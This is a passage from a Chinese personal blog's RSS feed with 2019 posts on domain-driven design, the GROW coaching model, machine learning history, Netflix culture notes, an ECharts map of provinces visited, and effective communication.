&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- 小孩教育：小天小学， 小月幼儿园
- 多陪家人
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;想给自己的礼物&quot;&gt;想给自己的礼物：&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;- apple  Watch ： 4k
- 适马 24-70 2.8   8k
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Fri, 29 Nov 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/11/29/2020-flags/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/11/29/2020-flags/</guid>
        
        
      </item>
    
      <item>
        <title>ddd</title>
        <description>&lt;p&gt;随着微服务和中台的兴起，领域驱动设计被越来越多的提起。&lt;/p&gt;

&lt;h2 id=&quot;设计与过程密不可分否则设计就是纸上谈兵&quot;&gt;&lt;strong&gt;设计与过程密不可分，否则设计就是纸上谈兵。&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;系统的架构设计或者领域模型是动态的，是演化而来并且将继续演化的。不是静态设计出来的。所以要“每个月过一下架构图”。&lt;/li&gt;
  &lt;li&gt;面对一个新系统（新人入职，交接过来一个系统。。。）时，应该先了解他的演化过程，有些东西看起来一坨，可能并没有想象的那么糟糕，他还是切实的在解决业务问题，对一些老旧系统，谨慎的“推到重来”。这时候，系统里的“老人”会显得很重要，因为他们了解演化过程，也有比较深层次的领域知识。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;领域驱动设计的实质就是消化吸收大量知识最后产生一个反应深层次领域知识并聚焦于关键概念的模型&quot;&gt;&lt;strong&gt;领域驱动设计的实质，就是&lt;em&gt;消化吸收大量知识&lt;/em&gt;，最后产生一个反应&lt;em&gt;深层次领域知识&lt;/em&gt;并聚焦于&lt;em&gt;关键概念&lt;/em&gt;的&lt;em&gt;模型&lt;/em&gt;。&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;这里面有几个关键词。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;首先是&lt;strong&gt;消化知识&lt;/strong&gt;，这里指的知识说的是领域知识，或者说业务知识。比如“京东所有处罚商家的规定，首先至少要向所有商家公示7天以上才可以被执行，否则会有法律风险。”这就是奖惩领域的知识。&lt;/li&gt;
  &lt;li&gt;然后是&lt;strong&gt;关键概念&lt;/strong&gt;，根据刚刚消化得到的知识，我们会提取几个概念：条例=京东颁布的处罚商家的规定。公示期=条例已经被颁布但还不能被执行的时间区间。然后我们就用这些概念来组成我们的领域模型，也用这些概念来互相交流。&lt;/li&gt;
  &lt;li&gt;最后是模型，那模型是什么呢？&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;模型是一种简化它是对现实的解释&quot;&gt;&lt;strong&gt;模型是一种简化，它是对现实的解释。&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;首先，&lt;strong&gt;现实是有无数面的&lt;/strong&gt;，我们观察到的永远是现实的某种解释，而不是现实本身。模&lt;strong&gt;型就是把与解决问题密切相关的方面抽象出来，而忽略无关的细节的那种解释&lt;/strong&gt;。比如，我们人类看到树是绿的，火是红的，但狗的眼睛构造与人不同，看不到这些光谱，它们看到的树是偏黄的，火是偏褐色的。那么问题来了，树和火到底是什么颜色？根本就不知道，甚至，颜色这个概念本身，也是一种模型，也是一种对现实的解释。&lt;/li&gt;
  &lt;li&gt;所以，&lt;strong&gt;领域模型，不是某种架构图&lt;/strong&gt;。而是图要传达出来的思想，也可以不用图，用文档表示，甚至可以用代码表示（极限编程XP推崇的就是——代码即文档）。&lt;/li&gt;
  &lt;li&gt;领域模型也不单单是领域专家（业务人员）头脑中的知识，只有大家共同认知到并且认可的知识才是领域模型。所以我们在实际工作中，一项非常难但非常重要的工作就是统一业务，产品，研发。。。所有参与人员对领域模型的认知。我理解，这也正是我们采用和推动领域驱动设计的一个重要原因。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;有效建模的要素&quot;&gt;有效建模的要素&lt;/h2&gt;

&lt;p&gt;那我们如何有效的建立我们的领域模型呢？&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;模型和实现的绑定&lt;/strong&gt;。就如第一点所说，我们设计的模型，一定要和代码实现绑定，别讨论的时候说的好像很有道理很完美，实现的时候又这里一个特殊逻辑那里一个实现不了。就成了所谓的PPT架构师了。&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;建立了一种基于模型的语言&lt;/strong&gt;。我觉得这是最重要的要素没有之一。模型是团队所有成员使用的通用语言的中枢。只有当业产研都使用同一套语言来沟通的时候，效率才会高，摩擦才会少。&lt;/li&gt;
  &lt;li&gt;开发一个蕴含丰富知识的模型&lt;/li&gt;
  &lt;li&gt;提炼模型&lt;/li&gt;
  &lt;li&gt;头脑风暴和实验&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;不同的团队成员使用不同的术语而不自知&quot;&gt;不同的团队成员使用不同的术语而不自知&lt;/h2&gt;

&lt;p&gt;很多时候，业务使用业务的语言，产品使用产品的语言，研发使用研发的语言在讨论问题，讨论了半天也没结果，或者讨论出来了一个带有歧义的结果。甚至，同一个词，在不同语言里表达的概念完全不同，比如“中台”比如“组件化”。这个时候需要共事的团队使用同一种公共语言，然而任何一方的语言都不能成为公共语言。需要融合提炼一套公共语言。确保团队在内部是的所有交流，以及代码中坚持使用这种语言。在画图，写文档，写代码，特别是讲话时也要使用这种语言。&lt;/p&gt;

</description>
        <pubDate>Wed, 06 Nov 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/11/06/ddd/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/11/06/ddd/</guid>
        
        <category>领域驱动设计</category>
        
        <category>架构师</category>
        
        
        <category>读书笔记</category>
        
      </item>
    
      <item>
        <title>高绩效教练</title>
        <description>&lt;p&gt;约翰·惠特默是个英国的贵族，拥有爵士头衔，二战回来后他办了一个体育俱乐部。里面同时教网球，滑雪，赛车……有时候网球教练不够了但滑雪教练闲着，于是他让滑雪教练去教网球。这时候出现了一个奇怪的现象：&lt;strong&gt;滑雪教练教出来的网球选手往往比网球教练教出来的打的好！&lt;/strong&gt; 为什么会这样呢？我们来看下两个教练典型的教学场景。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;当一个学员打了一个不太好的球。&lt;/p&gt;

  &lt;p&gt;网球教练：你这不对！手抬高一点，腰扭一下……&lt;/p&gt;

  &lt;p&gt;滑雪教练：你觉得刚才那个球哪里打的有问题？需要怎么调整一下？&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;惠特默爵士就发现，网球教练因为自己会，所以在&lt;strong&gt;指导&lt;/strong&gt;，直接告诉学员怎么怎么做。而滑雪教练因为不会，所以在&lt;strong&gt;提问&lt;/strong&gt;，启发学员自己去感受和体会。就从这个现象发展延伸出来一个教练提问的模型：GROW。&lt;/p&gt;

&lt;p&gt;G - Goal 目标设定，你想要什么？&lt;/p&gt;

&lt;p&gt;R - Reality 现状分析，你现在在哪儿？&lt;/p&gt;

&lt;p&gt;O - Options 方案选择，你能做什么？&lt;/p&gt;

&lt;p&gt;W - Will 行动意愿，你将做些什么？&lt;/p&gt;

&lt;p&gt;当你给别人建议，告诉别人应该怎么做的时候，往往会得到两种反馈。一是这个人生气了，觉得你是在指责他。二是这个人会下意识的找出很多反对意见，说这建议我试过了，没用！巴拉巴拉。这里面有一个责任感（谁应该为这件事儿负责，谁应该想办法解决这个问题）的转移问题。当一个人来问你该怎么办的时候，责任感在他自己，而一旦你轻易给了对方建议，告诉他怎么办的时候，责任感就到了你的身上。&lt;strong&gt;一个员工向管理者问这事应该怎么办的时候，80%的情况是这个员工心里已经有了答案，当一个管理者告诉员工一个解决方案的时候，70%的情况这个解决方案都是无效的。&lt;/strong&gt; 即使是一个有用的建议，但执行过程中总会遇到一些困难，如果是领导给的方法，员工第一反应是找领导，老大，按照你给的方法，遇到了一个xxx困难，你看该怎么办……你又给他一个建议，过几天又来找你又遇到yyy困难。无限循环。这个时候员工只是执行者，没有自己的思考。只有不给建议而是通过提问，让员工自己找到一个方法，即使在执行的过程中遇到了问题，因为这个方法是他自己找的，他也会自己再去找其他方法解决他。&lt;/p&gt;

&lt;p&gt;我们会发现&lt;strong&gt;放弃指导比学习教练更难！&lt;/strong&gt;而其中的关键就是要相信人的潜能。有些人在一个公司或一个部门干得不怎么样，但换了一个地方就干得非常好，因为那些地方释放了他们的潜能。所以只有相信了员工的无限潜能之后才能放下指导的架子变成教练。&lt;/p&gt;

&lt;p&gt;这里有一个相关的理论——马斯洛需求理论，以前我们认为，需求是分层的，只有满足了下层的需求才会追求上层的需求，其实不是的，这里有两个误解。一是如果上层的需求得到了极大的满足，下层需求可以几乎不要，比如“不为五斗米折腰”，我们团队有一个北京老爷们，就表示“干得爽少拿些钱也没关系”。二是如果上层得不到满足的话，会在下层拼命的索取。有些人，其实工资并不比别人低多少甚至还高一点点。但他就和你提加薪，提离职。很可能是上层自我实现的需求没得到很好的满足，当我们能给到员工足够的尊重和自我实现的价值感时，员工就会在下层减少需求，而教练式辅导就是能够给员工自我实现价值感的手段。&lt;/p&gt;

&lt;p&gt;一个人工作干不好，一般有两个原因，一是“拎不清”，没有自我觉察，搞不清楚当前的状况，自己要干嘛，最大的困难是什么；二是自我责任感不够。就感觉工作就是“拿多少钱干多少事儿”工作是领导的事儿公司的事儿就不是自己的事儿。当有件事儿做不到的时候不是真的做不到，只是他没想真做到。而GROW模型就是一个教练的工具，帮助我们让员工找到自我察觉，确立自我责任感。&lt;/p&gt;

&lt;p&gt;第一步，Goal。理清目标或激发他确立目标。当一个人说，我想要实现工作和生活的平衡。这个时候不是问怎么实现？为什么会有这个目标？而是应该问：怎么样才算工作和生活平衡？你打算什么时候实现他？这样的问题，让目标变得更清晰和具体。这里有一个特别要注意的问题，就是&lt;strong&gt;一定不要评价这个目标&lt;/strong&gt;。一旦评价，责任感就会到教练身上，这场教练就失败了。还有就是，就算一个目标不靠谱，最后被教练的人自己意识到目标不靠谱进而调整或放弃了这个目标，也是教练成功的标志。&lt;/p&gt;

&lt;p&gt;第二步，Reality。关于现状的问题有这些：现状是什么？那些事儿让你很心烦？&lt;strong&gt;你都做过哪些努力？&lt;/strong&gt;甚至有些人想了想会说“我好像也没做什么努力，只是在抱怨”这就是一个很好的自我觉察，如果是你指出这点，他会认为是指责，只有通过提问，让他自我觉察到这点。效果如何？都有谁与此相关？和你有关系的原因有哪些？&lt;strong&gt;你如何知道这是事实而不是你的感觉？&lt;/strong&gt; 这些问题都是让对方对现状有一个清晰准确的了解。前两步都是用来建立自我觉察的，后两步就开始建立自我责任了。&lt;/p&gt;

&lt;p&gt;第三步，Options。选择。你有哪些办法来解决这个问题？见过别人是怎么解决类似的问题吗？&lt;strong&gt;还有吗？&lt;/strong&gt; 同样，也不要评判解决方案。一旦评判，责任感又回到我们这了。所以在自己擅长的领域做辅导是最难的。如果对方案觉得怀疑的话，可以问“如果这样做的话，结果会怎么样？”来启发他进一步思考。帮助对方穷尽各种解决方案。&lt;/p&gt;

&lt;p&gt;第四步，Will。下一步将要做什么？你打算怎么做？什么时候开始？下一步的行动是什么？还需要什么资源与支持？帮助对方指定接下来的行动计划。&lt;/p&gt;

&lt;p&gt;整个过程下来，被辅导自己就会想清楚很多事情并且有对应的行动了。这里有一些常见陷阱，最大的就是“介入”，前面两次提到不要评判。在第三步，Options找行动方案的时候，有人会说好像没什么方案呢，真没什么办法呢。这个时候，他其实就是想让你来找解决方案，把责任交给你。千万别接茬！你应该问：你真的想要这个目标吗？真的想要就好好想。另外教练一定要放松，置身事外。&lt;/p&gt;

&lt;p&gt;变成教练式领导，最简单的开始就是，当一个员工来问你：这事儿应该怎么办的时候。你回答一句：“你觉得呢？”。这就是一个非常好的开始了。&lt;/p&gt;

</description>
        <pubDate>Tue, 17 Sep 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/09/17/coaching_for_performance/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/09/17/coaching_for_performance/</guid>
        
        <category>读书笔记</category>
        
        
        <category>读书笔记</category>
        
      </item>
    
      <item>
        <title>机器学习简史</title>
        <description>&lt;hr /&gt;

&lt;h1 id=&quot;一早期神经网络阶段&quot;&gt;一、早期神经网络阶段&lt;/h1&gt;

&lt;h2 id=&quot;1949年--赫布理论&quot;&gt;1949年  赫布理论&lt;/h2&gt;

&lt;p&gt;普遍ML被Hebb（赫布）提出，基于神经心理学的构想；&lt;/p&gt;

&lt;h2 id=&quot;1952年arthur-samuel---亚瑟-萨缪尔--机器学习之父&quot;&gt;&lt;strong&gt;1952年，Arthur Samuel   亚瑟 萨缪尔  机器学习之父&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;在IBM的时候开发了一个玩跳棋的程序，该程序能够通过棋子的位置学习一个隐式模型，为下一步棋提供比较好的走法。 塞缪尔与这个程序对局了很多次，并观察到这个程序在经过一段时间的学习后可以发挥得更好。&lt;strong&gt;他给机器学习下了一个定义：机器学习是一个能使计算机不用显示编程就能获得能力的研究领域。&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;1957年感知器模型被第二次提出&quot;&gt;1957年，感知器模型被第二次提出&lt;/h2&gt;

&lt;p&gt;Rosenblatt的基于神经科学背景（基础）的感知器模型被第二次提出，并且取得了一定的发展&lt;/p&gt;

&lt;h2 id=&quot;1969年minsky-提出异或问题神经网络遇到瓶颈&quot;&gt;1969年，Minsky 提出异或问题，神经网络遇到瓶颈，&lt;/h2&gt;

&lt;p&gt;被Minsky 提出的异或困扰，神经网络 一下子沉寂了10年，到80年代才有所突破&lt;/p&gt;

&lt;h2 id=&quot;1981年神经网络特定反向传播bp算法应用到多层感知器mlp&quot;&gt;1981年，神经网络特定反向传播（BP）算法应用到多层感知器（MLP）&lt;/h2&gt;

&lt;p&gt;直到1981年，Werbos [6]才提出将神经网络特定反向传播（BP）算法应用到多层感知器（MLP）。BP仍然是当今神经网络架构的关键组成部分。有了这些新想法，神经网络的研究再次加速。1985年至1986年间，神经网络研究人员相继提出了采用BP训练多层感知器（MLP）的理念&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;二统计学习方法的春天&quot;&gt;二、统计学习方法的春天&lt;/h1&gt;

&lt;h2 id=&quot;1986年决策树&quot;&gt;1986年，决策树&lt;/h2&gt;

&lt;p&gt;另一个学派，在1986年，J.R.Quinlan 提出了另一个非常著名的ML算法，我们称之为&lt;strong&gt;决策树&lt;/strong&gt;，更具体地说是ID3算法。这是机器学习另一个主流的闪光点。此外，ID3能够以简单的规则及其明确的推论更好地应用到实际生活中，与黑匣子神经网络模型相反。在ID3之后，出现了很多不同的可用方案和算法改进（例如ID4，回归树，CART …），而且仍然是机器学习中的活跃话题之一。&lt;/p&gt;

&lt;h2 id=&quot;1995年-svm&quot;&gt;1995年， SVM&lt;/h2&gt;

&lt;p&gt;SVM具有非常强的理论论证和实证结果，在2000年左右，SVM内核化版本提出之后在很多之前用NN模型解决的问题上得出了最佳结果。 此外，与NN模型相比，SVM能够充分利用凸优化，泛化边际理论和内核化的所有深奥知识。 因此，它可以从不同学科中获得巨大的推动力，促进理论和实践的快速发展。&lt;/p&gt;

&lt;h2 id=&quot;1997年adaboost&quot;&gt;1997年，Adaboost&lt;/h2&gt;

&lt;p&gt;1997年提出了另一个实体机器学习模型，该模型采用增强的弱分类器组合，称为Adaboost，Adaboost通过易于训练的弱分类器进行训练，给那些难的样本更高的权重。这种模型是许多不同任务的基础，如面部识别和检测。&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;三深度神经网络&quot;&gt;三、深度神经网络&lt;/h1&gt;

&lt;h2 id=&quot;2005年深度学习崛起&quot;&gt;2005年，深度学习崛起&lt;/h2&gt;

&lt;p&gt;NN 模型能够在对象识别、语音识别、NLP等不同的任务中击败之前的技术。但是应该注意的是，这并不意味着其他ML流派的结束。虽然深度学习的成功故事还在接二连三的上演，但是它在训练成本和调整模型的外部参数方面还有很多争议。此外，由于其简单性，SVM的使用依然非常普遍。&lt;/p&gt;

&lt;h2 id=&quot;2012年cnn碾压svm从此统治ai界&quot;&gt;2012年，CNN碾压SVM，从此统治AI界&lt;/h2&gt;

&lt;p&gt;Hinton课题组为了证明深度学习的潜力，首次参加ImageNet图像识别比赛，其通过构建的CNN网络&lt;strong&gt;AlexNet&lt;/strong&gt;一举夺得冠军，且碾压第二名（SVM方法）的分类性能。也正是由于该比赛，CNN吸引到了众多研究者的注意。&lt;/p&gt;

&lt;hr /&gt;

</description>
        <pubDate>Thu, 15 Aug 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/08/15/a-brief-history-of-machine-learning/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/08/15/a-brief-history-of-machine-learning/</guid>
        
        
      </item>
    
      <item>
        <title>Netfilx</title>
        <description>&lt;p&gt;前段时间参加北京Qcon，听腾讯黄闻欣一个关于技术团队管理的分享。其中很多观点都深以为然，和我的理念也比较贴合。演讲中他多次提到一本叫《奈飞文化手册》的书，并要求加入到他团队的人员必读。能看出他的很多做法和理念有受这本书的影响。奈飞(netflix)这家公司早有耳闻，于是动了想看看这本书的想法。&lt;/p&gt;

&lt;p&gt;Netflix是一个很牛逼的公司，成立20年，市值一千五百亿，和谷歌，Facebook，亚马逊并称美股四剑客。起初，Netflix只是一家做DVD租赁的小公司（我想很多80后小时候也用过这种服务吧），后来先后两次大转型成为视频分发公司和媒体内容创造公司成为今天的样子。这点我觉得和京东有些相似，京东最早是在中关村卖光盘的一个小柜台。后面转型成现在的综合电商。虽说一个企业的成功一定是系统性的成功，但企业的文化肯定是这个系统里非常重要的一个点。事实上，在本书出版之前，Netflix的企业文化就已经非常出名了。一份名为《奈飞文化集》的PPT早已在网络上流传，号称”硅谷最重要的文件”，下载量1500W(加上各种转发应该远大于这个值)。而这边书就是这份PPT的升级增强版本。更加系统的讲述了Netflix的8条文化准则。只是文化这种东西，从来都不能照搬照套，需要根据自身的情况，打造属于自己的文化。&lt;/p&gt;

&lt;p&gt;一个企业(团队)的文化，从来不是挂在墙上或写在纸上的那些词，它存在于人们的心里。要弄清一个企业的文化到底是什么样，要看他如何招人，如何做事儿，如何给钱，也包括如何裁人！而奈飞的第一条文化准则就说&lt;strong&gt;“我们只招成年人”&lt;/strong&gt;，那何谓成年人呢？就是那些认为”&lt;strong&gt;最好的激励是和牛逼的人一起干牛逼的事儿”&lt;/strong&gt;的人，而不是那些觉得”Google食堂有顶级大厨”人。我认为很多公司，尤其是现在的互联网公司，在招聘广告上都过分强调”福利”的部分了。什么免费的咖啡，美味的食堂，高大上的健身房……而且还有更恶俗的”程序员鼓励师”。有没搞错，我是来工作的不是来逛街的。这些福利应该仅仅是锦上添花的那一朵小花而已。对于”成年人”来说，更吸引人的招聘广告是更明确的描述我们的团年度是做什么的，当前的遇到了什么样困难和挑战，需要拥有什么样的技能的人来一起攻克他。如果还有吸引的部分就是”用牛逼的人来吸引牛逼的人”。&lt;/p&gt;

&lt;h2 id=&quot;铁打的营盘流水的兵&quot;&gt;铁打的营盘，流水的兵&lt;/h2&gt;

&lt;p&gt;和google的要招全世界最顶尖的人（用java是吧，那java语言的发明者，请到碗里来）不同，Netflix显得更加实用主义一些，招和岗位最匹配的人（”不是每个岗位都需要爱因斯坦”），并给他在这个岗位上市场的最高工资。如果实在不能支撑让所有人都拿到市场上最高的工资，那至少让关键岗位上的人拿到。关于薪水这个敏感话题，本书专门拿出一个准则来阐述了奈飞的独特做法”&lt;strong&gt;按照员工带来的价值付薪&lt;/strong&gt;“，这是一个很容易让员工个体看的热血沸腾的准则，具体包含”不要让员工在不得不离开时才获得应得的薪水”，”保证每个人都获得市场最高水平的薪水”，”告别密薪制，薪酬透明有助于市场定价”，“不论奈飞的业绩好坏，我们都按照市场顶级水平付薪”。这些行为在国内（国外价值观怎么样不知道~）的大部分人看来都甚是疯狂！作为国内大公司里的基层管理者，我认为实现这种机制的环境短时间内不会到来，所以对此我们先按下不表。不过值得一提的是，天下没有免费的午餐，在奈飞提供高薪的前提下，他对员工的要求也是很高的，如果你和当前岗位不是高度匹配的状态的话是要”被干掉”的。这就是上面说的，铁打的营盘，流水的兵。兵的流水，是为了营盘的铁打。这点和华为的理念很像。比如华为认为人力资源管理是为了保持组织活力，45岁就要退休等等，联想到华为的奋斗者协议和高工资，感觉这两家公司还真的是有很多相似之处。&lt;strong&gt;兵的流水，保证在营盘里的兵都是最合适的好兵，从而保证营盘是铁打的，因为营盘是铁打的，又能吸引更多的好兵流入&lt;/strong&gt;。这就是奈飞们的逻辑吧。奈飞明确提出”&lt;strong&gt;你建立的是团队，不是家庭&lt;/strong&gt;”“&lt;strong&gt;招聘谁和干掉谁的决定必须完全建立在团队绩效的基础上。&lt;/strong&gt;“企业需要流水兵还有一个重要原因是”&lt;strong&gt;企业在不同的阶段需要不同的员工&lt;/strong&gt;“，比如在初创阶段，需要的是快速试错，强执行，多面手这些都很适合。但是企业大了之后，试错成本越来越高；业务和系统越来越复杂，头痛医头脚痛医脚的方式也会越来越带来混乱和不可持续。需要更多的规划和抽象，最近正火的”中台战略”就来自于此。&lt;/p&gt;

&lt;h2 id=&quot;值得借鉴的一些实践&quot;&gt;值得借鉴的一些实践&lt;/h2&gt;

&lt;h3 id=&quot;永远在招聘&quot;&gt;永远在招聘&lt;/h3&gt;

&lt;p&gt;有说”管理是通过别人去取得结果的过程”，这里有两个变量，一个是你要取的结果是什么，一个是你通过什么样的人去取得。奈飞鼓励”&lt;strong&gt;现在就开始组建你未来需要的团队&lt;/strong&gt;“。你要做什么事儿，取得什么样的结果决定了你要什么样的人和多少人。我们通常发现这样的现象，一个人会问另一个管理者：”你带多少人啊？”潜台词就是管的人越多就越厉害，于是管理者就有不断扩张自己团队成员数量的欲望。而奈飞告诫说”不要让招聘成为一场数字游戏”，而是要持续的面向未来去规划所需要的团队。站在6个月之后，审视现在的团队，要做哪些准备，招什么样的人。这就要求我们能够”永远在招聘”，公司有”不定期的招聘开窗期”是非常可怕的。一方面，遇见需要的优秀人员时可能因为不在开窗期而不能及时招入，另一方面，出于这种担心，管理者会在开窗期招入很多”还凑活”的人进来，这会极大的稀释团队的人才密度。&lt;/p&gt;

&lt;h3 id=&quot;让员工像老板一样思考&quot;&gt;让员工像老板一样思考&lt;/h3&gt;

&lt;p&gt;所有员工都能像老板一样思考，那东哥做梦都会笑出声来吧。奈飞要求他的客服入职就必须学会看公司的损益表。”让每个人都理解公司业务”。理解业务，就是理解商业的本质：”你为客户提供服务，他们向你付钱，这笔钱扣掉运营成本，剩下的就是利润，这就是商业的本质。”我们做研发的，往往离一线的业务很远，很多时候都在埋头写代码，做功能。我想如果一个研发在写一段代码的时候能考虑到这段代码能为公司带来多少收益而运行这段代码需要消耗多少服务器资源就是一个良好的开始了。既然招的都是”成年人”那就应该值得信任。把公司遇到的困难和所有人说明，大家不会承受不了打击而纷纷离职（离职的不是你要找的成年人），而是会更好的理解和帮助公司解决这些困难。在当前这个VUCA时代，一切都变化得太块了，应该保持沟通的强节奏，并且持续进行。&lt;/p&gt;

&lt;h3 id=&quot;开始停止继续&quot;&gt;开始、停止、继续&lt;/h3&gt;

&lt;p&gt;坦诚，是沟通的根基之一。而”开始，停止，继续”是奈飞用来促进坦诚沟通的一种游戏，每次高层管理者会议，会要求每一个人对另一个人一个反馈，他应该开始做什么事儿了，应该停止某件不应该做的事儿以及继续做什么事儿。然后把这些信息共享给所有人。进而全公司都会受到感染，用这种方式形成一个坦诚的沟通环境。&lt;/p&gt;
</description>
        <pubDate>Mon, 17 Jun 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/06/17/netfilx/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/06/17/netfilx/</guid>
        
        <category>netfilx</category>
        
        <category>奈飞</category>
        
        <category>团队</category>
        
        <category>文化</category>
        
        
      </item>
    
      <item>
        <title>足迹地图</title>
        <description>&lt;div id=&quot;main&quot; style=&quot;height:40em;&quot;&gt;&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/echarts/4.2.1/echarts.min.js&quot;&gt;&lt;/script&gt;

&lt;script type=&quot;text/javascript&quot; src=&quot;/js/china.js&quot;&gt;&lt;/script&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
window.onload=function(){
	var mydata = [
		{name: '北京',value: 1 },{name: '天津',value: 1 },
	{name: '上海',value: 1 },{name: '重庆',value: 1 },
	{name: '河北',value: 1 },{name: '河南',value: 10 },
	{name: '云南',value: 10 },{name: '辽宁',value: 10 },
	{name: '黑龙江',value: 10 },{name: '湖南',value: 10 },
	{name: '安徽',value: 10 },{name: '山东',value: 1 },
	{name: '新疆',value: 10 },{name: '江苏',value: 1 },
	{name: '浙江',value: 1 },{name: '江西',value: 1 },
	{name: '湖北',value: 1 },{name: '广西',value: 10 },
	{name: '甘肃',value: 1 },{name: '山西',value: 10 },
	{name: '内蒙古',value: 10 },{name: '陕西',value: 1 },
	{name: '吉林',value: 10 },{name: '福建',value: 1 },
	{name: '贵州',value: 10 },{name: '广东',value: 1 },
	{name: '青海',value: 1 },{name: '西藏',value: 10 },
	{name: '四川',value: 1 },{name: '宁夏',value: 10 },
	{name: '海南',value: 10 },{name: '台湾',value: 10 },
	{name: '香港',value: 10 },{name: '澳门',value: 10 }
	];
var option = {
		visualMap: {
			show : false,
			splitList: [ 
				{start: 5, end:10},{start: 1, end: 2}
			],
			color: ['#ccc', '#0f0']
		},
		series: [{
		  type: 'map',
		  mapType: 'china', 
		  roam: false,
		  data:mydata
		}]
	};
var chart = echarts.init(document.getElementById('main'));
chart.setOption(option);
}
&lt;/script&gt;

</description>
        <pubDate>Tue, 11 Jun 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/06/11/footprints/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/06/11/footprints/</guid>
        
        
        <category>生活</category>
        
      </item>
    
      <item>
        <title>达到了沟通的目的才算有效沟通</title>
        <description>&lt;h3 id=&quot;wtf我邮件文档里不是写了吗&quot;&gt;WTF，我邮件/文档里不是写了吗？&lt;/h3&gt;

&lt;p&gt;想象一下这个场景是否很常见？周五下午，你把你一周的工作内容和取得的进展都写进了一篇长长的周报，然后发给了领导和相关涉及的同事。但周一还是会有很多人来询问你相关工作的进展和各种情况。这个时候也许你会想：WTF，我邮件里不是都写了吗？&lt;/p&gt;

&lt;p&gt;你的工作进展已经通过邮件发给了相关的人，但对方没看或者看了没get到，进而造成的各种工作不顺，这是谁的问题？这是个问题！我觉得按照”谁受益，谁负责”的原则，这是你的问题！&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;沟通的目的是为了传递信息或思想&lt;/strong&gt;，如果作为沟通的发起方，只自顾自的将信息甩出去而不管接收方是否收到并正确理解，并还认为”这不是我的问题”的人就如同自欺欺人+掩耳盗铃。&lt;strong&gt;达到了沟通的目的才算有效沟通&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;所以，沟通其实一共分两步：1、将信息准确的传递出去；2、确认对方收到并理解无误。TCP作为著名计算机网络的通信协议，整个互联网的基础，就是这么干的。所有的信息传递都有一个确认的过程。很多人会比较容易忽略第二步，其实最简单的实践就是让对方在复述一遍你说的话，如果能正确复述，就ok了，否则，应该继续沟通。&lt;/p&gt;

&lt;h3 id=&quot;为了沟通效果需要使用对方能听懂的语言&quot;&gt;为了沟通效果，需要使用对方能听懂的语言&lt;/h3&gt;

&lt;p&gt;关于这点，中国文化有很多相关的内容。比如：到什么山唱什么歌；见人说人话，见鬼说鬼话；入乡随俗……等等等。描述相反的情形也有很多词：鸡同鸭讲，对牛弹琴……等等等。&lt;/p&gt;

&lt;p&gt;这点作为研发同学尤其要注意，很多研发和人沟通习惯使用太过专业的术语，以至于业务和产品同学无法理解。应时刻谨记沟通的目的是将信息正确的传递到对方的脑袋里，而不是卖弄自己有多少专业知识。&lt;/p&gt;

&lt;p&gt;google曾经有一个著名的面试题，至今值得思考：如何向你80岁的老奶奶说明什么是搜索引擎？&lt;/p&gt;

&lt;h3 id=&quot;说服不是目的沟通才是&quot;&gt;&lt;strong&gt;说服不是目的，沟通才是！&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;还有很多时候，沟通双方持有的观点是冲突的。这时沟通很容易演变成争吵，而沟通双方也很容易陷入到”说服对方”的泥潭里去。想象你和一个人吵架并且吵输了，然后回来你会在心理再吵八百遍，当时这么这么说就好了！看出来了吗？虽然你当时被说的哑口无言，看似被说服了，但对方的思想并没有到你的脑袋里来。&lt;/p&gt;

&lt;p&gt;同样的道理，当我们处于沟通双方比较强势的一方时，需要谨慎的区分对方是被暂时的说服了，被你的淫威压制了，还是真正的你的思想被对方认可了。&lt;/p&gt;
</description>
        <pubDate>Thu, 16 May 2019 00:00:00 +0800</pubDate>
        <link>http://laichendong.com/2019/05/16/effective-communication/</link>
        <guid isPermaLink="true">http://laichendong.com/2019/05/16/effective-communication/</guid>
        
        
        <category>读书笔记</category>
        
      </item>
    
  </channel>
</rss>
